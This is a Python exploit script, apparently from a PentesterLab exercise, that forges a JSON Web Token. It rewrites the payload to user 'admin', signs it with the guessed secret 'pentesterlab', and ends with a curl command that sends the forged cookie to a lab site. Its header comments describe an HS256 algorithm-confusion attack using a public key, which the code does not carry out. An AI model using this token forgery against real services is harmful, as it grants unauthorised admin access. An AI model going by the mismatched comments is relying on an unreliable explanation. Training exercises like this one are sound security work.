# python 2 or 3 version exploit
# This exploit will break apart the JWT into its respective parts, decode the header and payload, change the payload to be an admin, change the header type to HS256, cimbine the new header and new payload to be the data that will be signed, and sign the new data with the public key in the public.pem file to make a new JWT.
# From here we can curl "curl -H "Cookie: auth=" http://so/" where the cookie is the new JWT cooking without the trailing "=" and the URL of the main site. 
# This new token can also be placed in the webpage once logged in as a general user and then replacing the cookie for the new token. On refresh the user will be admin.

import hmac
import base64
import hashlib
import json
from sys import version_info

# orig header = {"typ":"JWT","alg":"HS256"}
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
h, p, s= jwt.split(".")

# header will stay the same for this
header = {"typ":"JWT","alg":"HS256"}

# orig payload(p) = '{"user":null}'
# eyJ1c2VyIjpudWxsfQ
newPayload = {"user":"admin"}

key = 'pentesterlab'

def sign(str,key):
    if version_info[0] == 2:
        return base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('utf8').rstrip("=")
    else:
        return base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'), str.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip("=")

if version_info[0] == 2:
    payload = base64.urlsafe_b64encode(json.dumps({"user":"admin"})).rstrip("=")    
    print(h+"."+payload+"."+sign(h+"."+payload, key))
else:
    payload = base64.urlsafe_b64encode(bytes(json.dumps({"user":"admin"}), encoding='utf8')).decode('utf8').rstrip("=")
    print(h+"."+payload+"."+sign(h+"."+payload, key))


# curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc=" http://ptl-c6b6c5f7-e80c6b1e.libcurl.so/